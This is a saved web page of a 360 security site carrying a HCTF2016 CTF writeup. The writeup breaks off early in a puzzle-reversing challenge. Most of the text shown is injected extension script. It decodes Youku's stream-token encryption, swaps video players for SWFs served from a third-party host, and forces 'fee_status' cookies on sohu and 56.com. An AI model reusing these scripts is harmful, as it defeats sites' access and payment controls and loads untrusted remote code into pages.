                    r.logos[M] = p,
                        r.streams[M] = h,
                        r.typeArr[M] = f
                }
                this._videoSegsDic = r,
                    this._videoSegsDic.lang = this.langCodeToCN(o[0]).key
            }
            function c(e) {
                this._randomSeed = e,
                    this.cg_hun()
            }
            var d = e("./canPlayM3U8"),
                u = e("./ajax"),
                h = [19, 1, 4, 7, 30, 14, 28, 8, 24, 17, 6, 35, 34, 16, 9, 10, 13, 22, 32, 29, 31, 21, 18, 3, 2, 23, 25, 27, 11, 20, 5, 15, 12, 0, 33, 26],
                p = {
                    a3: "b4et",
                    a4: "boa4"
                },
                m = {
                    a1: "4",
                    a2: "1"
                };
            n.match = function (e) {
                return /v\.youku\.com/.test(e.attr("host")) && !! window.videoId
            },
                n.parseYoukuCode = function (e, t) {
                    u({
                        url: "http://play.youku.com/play/get.json?vid=" + e + "&ct=12",
                        jsonp: !0,
                        callback: function (n) {
                            -1 == n && console.log("\u89e3\u6790youku\u89c6\u9891\u5730\u5740\u5931\u8d25", 2);
                            var c = n.data,
                                u = a(s(p.a3 + "o0b" + m.a1, h).toString(), o(c.security.encrypt_string)).split("_");
                            if (m.sid = u[0], m.token = u[1], d) {
                                var f = {
                                        vid: window.videoId,
                                        type: "[[type]]",
                                        ts: parseInt((new Date).getTime() / 1e3),
                                        keyframe: 0,
                                        ep: encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + e + "_" + m.token))),
                                        sid: m.sid,
                                        token: m.token,
                                        ctype: 12,
                                        ev: 1,
                                        oip: c.security.ip,
                                        client_id: "youkumobileplaypage"
                                    },
                                    v = "http://pl.youku.com/playlist/m3u8?" + i(f);
                                t([
                                    ["\u8d85\u6e05", v.replace("[[type]]", "hd2")],
                                    ["\u9ad8\u6e05", v.replace("[[type]]", "mp4")],
                                    ["\u6807\u6e05", v.replace("[[type]]", "flv")]
                                ])
                            } else {
                                var g = new l(c, c.stream, "mp4");
                                console.log(g._videoSegsDic.streams),
                                    t([
                                        ["\u6807\u6e05", g._videoSegsDic.streams.guoyu["3gphd"][0].src]
                                    ])
                            }
                        }
                    })
                },
                n.getVideos = function (e, t) {
                    n.parseYoukuCode(window.videoId, t)
                },
                c.prototype = {
                    cg_hun: function () {
                        this._cgStr = "";
                        for (var e = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/\\:._-1234567890", t = e.length, n = 0; t > n; n++) {
                            var i = parseInt(this.ran() * e.length);
                            this._cgStr += e.charAt(i),
                                e = e.split(e.charAt(i)).join("")
                        }
                    },
                    cg_fun: function (e) {
                        for (var t = e.split("*"), n = "", i = 0; i < t.length - 1; i++) n += this._cgStr.charAt(t[i]);
                        return n
                    },
                    ran: function () {
                        return this._randomSeed = (211 * this._randomSeed + 30031) % 65536,
                        this._randomSeed / 65536
                    }
                },
                l.prototype = {
                    getFileId: function (e, t) {
                        if (null == e || "" == e) return "";
                        var n = "",
                            i = e.slice(0, 8),
                            o = t.toString(16);
                        1 == o.length && (o = "0" + o),
                            o = o.toUpperCase();
                        var r = e.slice(10, e.length);
                        return n = i + o + r
                    },
                    isValidType: function (e) {
                        return "3gphd" == e || "flv" == e || "flvhd" == e || "mp4hd" == e || "mp4hd2" == e || "mp4hd3" == e ? !0 : !1
                    },
                    convertType: function (e) {
                        var t = e;
                        switch (e) {
                            case "m3u8":
                                t = "mp4";
                                break;
                            case "3gphd":
                                t = "3gphd";
                                break;
                            case "flv":
                                t = "flv";
                                break;
                            case "flvhd":
                                t = "flv";
                                break;
                            case "mp4hd":
                                t = "mp4";
                                break;
                            case "mp4hd2":
                                t = "hd2";
                                break;
                            case "mp4hd3":
                                t = "hd3"
                        }
                        return t
                    },
                    langCodeToCN: function (e) {
                        var t = "";
                        switch (e) {
                            case "default":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "guoyu":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "yue":
                                t = {
                                    key: "yue",
                                    value: "\u7ca4\u8bed"
                                };
                                break;
                            case "chuan":
                                t = {
                                    key: "chuan",
                                    value: "\u5ddd\u8bdd"
                                };
                                break;
                            case "tai":
                                t = {
                                    key: "tai",
                                    value: "\u53f0\u6e7e"
                                };
                                break;
                            case "min":
                                t = {
                                    key: "min",
                                    value: "\u95fd\u5357"
                                };
                                break;
                            case "en":
                                t = {
                                    key: "en",
                                    value: "\u82f1\u8bed"
                                };
                                break;
                            case "ja":
                                t = {
                                    key: "ja",
                                    value: "\u65e5\u8bed"
                                };
                                break;
                            case "kr":
                                t = {
                                    key: "kr",
                                    value: "\u97e9\u8bed"
                                };
                                break;
                            case "in":
                                t = {
                                    key: "in",
                                    value: "\u5370\u5ea6"
                                };
                                break;
                            case "ru":
                                t = {
                                    key: "ru",
                                    value: "\u4fc4\u8bed"
                                };
                                break;
                            case "fr":
                                t = {
                                    key: "fr",
                                    value: "\u6cd5\u8bed"
                                };
                                break;
                            case "de":
                                t = {
                                    key: "de",
                                    value: "\u5fb7\u8bed"
                                };
                                break;
                            case "it":
                                t = {
                                    key: "it",
                                    value: "\u610f\u8bed"
                                };
                                break;
                            case "es":
                                t = {
                                    key: "es",
                                    value: "\u897f\u8bed"
                                };
                                break;
                            case "po":
                                t = {
                                    key: "po",
                                    value: "\u8461\u8bed"
                                };
                                break;
                            case "th":
                                t = {
                                    key: "th",
                                    value: "\u6cf0\u8bed"
                                }
                        }
                        return t
                    },
                    getVideoSrc: function (e, t, n, i, o, l, c) {
                        var d = n.stream[e],
                            u = n.video.encodeid;
                        if (!u || !i) return "";
                        var f = {
                                flv: 0,
                                flvhd: 0,
                                mp4: 1,
                                hd2: 2,
                                "3gphd": 1,
                                "3gp": 0
                            },
                            v = f[i],
                            g = {
                                flv: "flv",
                                mp4: "mp4",
                                hd2: "flv",
                                mp4hd: "mp4",
                                mp4hd2: "mp4",
                                "3gphd": "mp4",
                                "3gp": "flv",
                                flvhd: "flv"
                            },
                            y = g[i],
                            b = t.toString(16);
                        1 == b.length && (b = "0" + b);
                        var w = d.segs[t].total_milliseconds_video / 1e3,
                            x = d.segs[t].key;
                        ("" == x || -1 == x) && (x = d.key2 + d.key1);
                        var k = "";
                        n.show && (k = n.show.pay ? "&ypremium=1" : "&ymovie=1");
                        var A = "/player/getFlvPath/sid/" + m.sid + "_" + b + "/st/" + y + "/fileid/" + o + "?K=" + x + "&hd=" + v + "&myp=0&ts=" + w + "&ypp=0" + k,
                            C = encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + o + "_" + m.token)));
                        return A += "&ep=" + C,
                            A += "&ctype=12",
                            A += "&ev=1",
                            A += "&token=" + m.token,
                            A += "&oip=" + this._ip,
                            A += (l ? "/password/" + l : "") + (c ? c : ""),
                            A = "http://k.youku.com" + A
                    }
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        15: [function (e, t) {
            t.exports = [e("./seeker_youku"), e("./seeker_tudou"), e("./seeker_hunantv")]
        },
            {
                "./seeker_hunantv": 12,
                "./seeker_tudou": 13,
                "./seeker_youku": 14
            }]
    }, {}, [1]);
//# sourceMappingURL=index.js.map
</script><script>doAdblock();
function doAdblock(){
    (function() {
        function A() {}
        A.prototype = {
            rules: {
                /*youku_loader: {
                 find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/loaders?[^\.]*\.swf/,
                 replace: "http://2016.adtchrome.com/loader.swf"
                 },
                 youku_player: {
                 find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/(q?player[^\.]*|\w{13})\.swf/,
                 replace: "http://2016.adtchrome.com/player.swf"
                 },*/
                'pps_pps': {
                    'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/pps_flvplay_s\.swf/,
                    'replace': 'http://swf.adtchrome.com/pps_20140420.swf'
                },
                /*'iqiyi_1': {
                 'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },
                 'iqiyi_2': {
                 'find': /^http:\/\/www\.iqiyi\.com\/common\/flashplayer\/\d+\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },*/
                'ku6': {
                    'find': /^http:\/\/player\.ku6cdn\.com\/default\/.*\/\d+\/(v|player|loader)\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf'
                },
                'ku6_topic': {
                    'find': /^http:\/\/player\.ku6\.com\/inside\/(.*)\/v\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf?vid=$1'
                },
                'sohu': {
                    'find':/http:\/\/(tv\.sohu\.com\/upload\/swf\/(?!(ap|56)).*\d+|(\d+\.){3}\d+(:\d+)?\/(web|test)player)\/(Main|PlayerShell)[^\.]*\.swf/,
                    'replace': "http://adtchrome.b0.upaiyun.com/sohu_live.swf"
                },
                /*'sohu2':{
                 'find':/^http:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/testplayer\/Main0?\.swf/,
                 'replace':'http://www.adtchrome.com/sohu/sohu_20150104.swf'
                 },
                 'sohu_share': {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/my\/v\.swf&/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?'
                 },
                 'sohu_sogou' : {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/(\d+)\/v\.swf/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?vid=$1'
                 },
                 'letv': {
                 'find': /^http:\/\/player\.letvcdn\.com\/.*p\/.*\/newplayer\/LetvPlayer\.swf/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_topic': {
                 'find': /^http:\/\/player\.hz\.letv\.com\/hzplayer\.swf\/v_list=zhuanti/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_duowan': {
                 'find': /^http:\/\/assets\.dwstatic\.com\/video\/vpp\.swf/,
                 'replace': 'http://yuntv.letv.com/bcloud.swf'
                 },*/
                '17173_in':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFile(Customer)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_in_20150522.swf"
                },
                '17173_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFileFirstpage\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_out_20150522.swf"
                },
                '17173_live':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream(_firstpage)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_stream_20150522.swf"
                },
                '17173_live_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream_(custom)?Out\.swf/,
                    'replace':"http://swf.adtchrome.com/17173.out.Live.swf"
                }
            },
            _done: null,
            get done() {
                if(!this._done) {
                    this._done = new Array();
                }
                return this._done;
            },
            addAnimations: function() {
                var style = document.createElement('style');
                style.type = 'text/css';
                style.innerHTML = 'object,embed{\
                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;\
                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;\
                -o-animation-duration:.001s;-o-animation-name:playerInserted;\
                animation-duration:.001s;animation-name:playerInserted;}\
                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}';
                document.getElementsByTagName('head')[0].appendChild(style);
            },
            animationsHandler: function(e) {
                if(e.animationName === 'playerInserted') {
                    this.replace(e.target);
                }
            },
            replace: function(elem) {
                if (/http:\/\/v.youku.com\/v_show\/.*/.test(window.location.href)){
                    var tag = document.getElementById("playerBox").getAttribute("player")
                    if (tag == "adt"){
                        console.log("adt adv")
                        return;
                    }
                }
                if(this.done.indexOf(elem) != -1) return;
                this.done.push(elem);
                var player = elem.data || elem.src;
                if(!player) return;
                var i, find, replace = false;
                for(i in this.rules) {
                    find = this.rules[i]['find'];
                    if(find.test(player)) {
                        replace = this.rules[i]['replace'];
                        if('function' === typeof this.rules[i]['preHandle']) {
                            this.rules[i]['preHandle'].bind(this, elem, find, replace, player)();
                        }else{
                            this.reallyReplace.bind(this, elem, find, replace)();
                        }
                        break;
                    }
                }
            },
            reallyReplace: function(elem, find, replace) {
                elem.data && (elem.data = elem.data.replace(find, replace)) || elem.src && ((elem.src = elem.src.replace(find, replace)) && (elem.style.display = 'block'));
                var b = elem.querySelector("param[name='movie']");
                this.reloadPlugin(elem);
            },
            reloadPlugin: function(elem) {
                var nextSibling = elem.nextSibling;
                var parentNode = elem.parentNode;
                parentNode.removeChild(elem);
                var newElem = elem.cloneNode(true);
                this.done.push(newElem);
                if(nextSibling) {
                    parentNode.insertBefore(newElem, nextSibling);
                } else {
                    parentNode.appendChild(newElem);
                }
            },
            init: function() {
                var handler = this.animationsHandler.bind(this);
                document.body.addEventListener('webkitAnimationStart', handler, false);
                document.body.addEventListener('msAnimationStart', handler, false);
                document.body.addEventListener('oAnimationStart', handler, false);
                document.body.addEventListener('animationstart', handler, false);
                this.addAnimations();
            }
        };
        new A().init();
    })();
}
// 20140730
(function cnbeta() {
    if (document.URL.indexOf('cnbeta.com') >= 0) {
        var elms = document.body.querySelectorAll("p>embed");
        Array.prototype.forEach.call(elms, function(elm) {
            elm.style.marginLeft = "0px";
        });
    }
})();
//baidu
//display: inline !important; visibility: visible !important;
//display:block !important;visibility:visible !important; display:block !important;visibility:visible !important
if(document.URL.indexOf('www.baidu.com') >= 0){
    if(document && document.getElementsByTagName && document.getElementById && document.body){
        var a = function(){
            Array.prototype.forEach.call(document.body.querySelectorAll("#content_left>div,#content_left>table"), function(e) {
                var a = e.getAttribute("style");
                if(a && /display:(table|block)\s!important/.test(a)){
                    e.parentNode.removeChild(e)
                }
            });
        };
        a();
        var MutationObserver = window.MutationObserver ||  window.WebKitMutationObserver || window.MozMutationObserver;
        var callback = function(records) {
            records.map(function(record) {
                console.log('block baidu')
                a();
            });
        };
        var mo = new MutationObserver(callback);
        mo.observe(document.getElementById('wrapper_wrapper'), { 'childList': true, 'subtree': true });
    };
}
// 20140922
(function kill_360() {
    if (document.URL.indexOf('so.com') >= 0) {
        document.getElementById("e_idea_pp").style.display = none;
    }
})();
//解决腾讯视频列表点击无效
if(document.URL.indexOf("v.qq.com") >= 0){
    if (document.getElementById("mod_videolist")){
        var listBox = document.getElementById("mod_videolist")
        var list = listBox.getElementsByClassName("list_item")
        for (i = 0;i < list.length;i++){
            list[i].addEventListener("click", function() {
                var url = this.getElementsByTagName("a")[0]
                url = url.getAttribute("href")
                var host = window.location.href
                url = host.replace(/cover\/.*/,url)
                window.location.href = url
            })
        }
    }
}
if (document.URL.indexOf("tv.sohu.com") >= 0){
    if (document.cookie.indexOf("fee_status=true")==-1){document.cookie='fee_status=true'};
}
if (document.URL.indexOf("56.com") >= 0){
    if (document.cookie.indexOf("fee_status=true")==-1){document.cookie='fee_status=true'};
}
if(/v\.youku\.com\/v_show\/id/.test(document.URL)){
    document.getElementById('module_basic_playarea').style.paddingBottom = '40px';
    document.getElementById('vpactionv5_wrap').style.position = 'absolute';
    document.getElementById('vpactionv5_wrap').style.top = '50px'
}
</script><style type="text/css">object,embed{                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;                -o-animation-duration:.001s;-o-animation-name:playerInserted;                animation-duration:.001s;animation-name:playerInserted;}                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}</style></head>
<body onload="iscrollLoaded();">
<div id="is-mobile"></div>

<div class="container">
		<div class="mobile-header">
    <div class="header clearfix">
        <div class="header-wrapper clearfix">
            <a href="http://bobao.360.cn/index/index" class="logo"><img class="slogan" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/logo.png"></a>
                        <form id="search" class="search-box" action="http://bobao.360.cn/search/index" method="GET">
                <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                <input class="icon" type="submit" value="">
                <input type="hidden" name="type" value="">
            </form>
            <div class="bug">
                <div class="name"><span class="seled">漏洞</span><i class="arrow"></i></div>
                <ul class="typelist">
                    <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                    <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                    <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                </ul>
            </div>
                        <div class="logNreg mobile-hide">
                <div class="unlog">
                    <i></i>
                    <a href="http://bobao.360.cn/ctf/detail/log.html" class="log">登录</a>
                    <span>|</span>
                    <a href="http://bobao.360.cn/ctf/detail/reg.html" class="reg">注册</a>
                </div>
                <div class="loged">
                    <a href="http://bobao.360.cn/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                    <div class="user-links">
                        <span class="arrow"></span>
                        <ul>
                            <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage" target="_blank"><i></i><span>账号设置</span></a></li>
                            <li class="alert-setting"><a href="http://bobao.360.cn/keywords/index" target="_blank"><i></i><span>告警设置</span></a></li>
                            <li class="bug-alert"><a href="http://bobao.360.cn/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a></li>
                            <li class="my-knowl"><a href="http://bobao.360.cn/mylearn/index" target="_blank"><i></i><span>我的知识</span></a></li>
                            <li class="my-knowl"><a href="http://bobao.360.cn/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a></li>
                            <li class="my-exit"><a href="http://login.360.cn/?src=pcw_adlab&amp;op=logout&amp;destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a></li>
                        </ul>
                    </div>

                    <a href="http://bobao.360.cn/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                    <div class="message-links">
                        <span class="arrow"></span>
                        <ul>
                            <li class="account-setting" style="display:none;"><a href="http://bobao.360.cn/myres/index" target="_blank"><i></i><span>回复我的</span></a>
                            </li>
                            <li class="my-bug"><a href="http://bobao.360.cn/myvul/index" target="_blank"><i></i><span>我的漏洞</span></a></li>
                            <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                            <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                            </li>-->
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <style type="text/css">
        .nav{overflow: hidden;}
        .nav .scroll{width: auto;}
    </style>
    <div id="wrapper">
        <div id="scroller" class="nav" style="overflow: visible;">
            <div class="scroll">
                <ul class="nav-list">
                    <li><a class="link-nav" href="http://bobao.360.cn/index/index">首页</a></li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/vul/index">漏洞</a>
                    </li>
                    <li>
			<a class="link-nav" href="http://bobao.360.cn/introduce/list">招聘</a>
		    </li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                    </li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="http://bobao.360.cn/course/index">学院</a></li>
                        </ul>
                    </li>
                    <li><a class="link-nav" href="http://bobao.360.cn/activity/index">活动</a></li>
                    <li class="mobile-hide cur"><a class="link-nav" href="http://bobao.360.cn/ctf/index">CTF训练营</a></li>
                    <li><a class="link-nav" href="http://bobao.360.cn/interref/list">安全内参</a></li>
                    <li><a class="link-nav" href="http://bobao.360.cn/app/index">APP</a></li>
                    
                    <!--<li ><a href="/course/index">学院</a></li>-->
                    <!--<li ><a href="/introduce/list">招聘</a></li>-->
                    <!--<li class="cur" class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                </ul>
            </div>
        </div>
    </div>
    </div>
        
    <div class="mobile-content">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/news.css">
<link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/shCoreDefault.css">
<style>
p .syntaxhighlighter{
	width:80%;
}
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; CTF知识详情</div>

<div class="content clearfix">
  <div class="main">
      <div class="article">
          <div id="article_box">
            <h2>【CTF攻略】FlappyPig HCTF2016 Writeup</h2>
            <p class="article-msg">
                <span class="time">2016-11-29 11:10:09</span>
                <span class="orig">来源：安全客</span>                                <span class="orig">作者：<a href="http://bobao.360.cn/member/contribute?uid=1184812799" style="color:#848e99;">FlappyPig</a></span>
                <br>
                                <span class="read">阅读：33784次</span>
                <span><a class="good" href="javascript:;" data-target="/ctf/good" data-value="g_179" data-type="ctf">点赞(1)</a></span>
                <span><a class="fav" href="javascript:;" data-target="/myctf/add" data-pk="179" data-type="ctf">收藏(71)</a></span>
            </p>
            <hr size="1">
            <div class="article-msg">
            	<p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
            </div>
            <p></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t016c5fd5cad899f35b.jpg" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t016c5fd5cad899f35b.jpg" alt="http://p7.qhimg.com/t01b9083f0141b85a20.jpg" style="visibility: visible;"></a></span></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">作者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=1184812799" target="_blank" textvalue="FlappyPig" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">FlappyPig</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">预估稿费：600RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">投稿方式：发送邮件至linwei#360.cn，或登陆<strong><a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong>网页版</strong></span></a></strong>在线投稿</span></strong></span></p><p style="text-indent: 0em;"><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Flip</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">一．本题是一个linux下的qt程序。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要分成三个部分</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.一个多阶Flip game</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.一个三阶错乱的Flip game</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.一个内存中执行的三阶Flip game,执行操作由第二个游戏的步子有关。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二．第一关游戏很简单，从主对角线开始一直走对角线即可。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">或者爆破406035这个位置</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0174529115a8b8cf58.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0174529115a8b8cf58.png" title="t01d36bd491430636f0.png" alt="http://p0.qhimg.com/t01d36bd491430636f0.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三．第二关是一个错位的Flip game</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所谓的错乱就是错乱了逻辑，例如一个正常的3*3 Flip逻辑为</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1 2 3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1 3 2</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4 5 6 &nbsp; 错乱之后为 &nbsp; 7 9 8</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7 8 9 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4 6 5</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二关最多只能有7步，超过7步就算失败</span><br></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014002ea9474f52066.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014002ea9474f52066.png" title="t01e1e0ca79d5bbbc5b.png" alt="http://p3.qhimg.com/t01e1e0ca79d5bbbc5b.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以需要遍历出第二关所有的走法</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所有可能如下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">[1,&nbsp;3,&nbsp;2,&nbsp;9,&nbsp;4,&nbsp;5,&nbsp;3]</code></div><div class="line number2 index1 alt1"><code class="plain plain">[1,&nbsp;3,&nbsp;2,&nbsp;9,&nbsp;5,&nbsp;3,&nbsp;4]</code></div><div class="line number3 index2 alt2"><code class="plain plain">[1,&nbsp;3,&nbsp;2,&nbsp;9,&nbsp;5,&nbsp;4,&nbsp;3]</code></div><div class="line number4 index3 alt1"><code class="plain 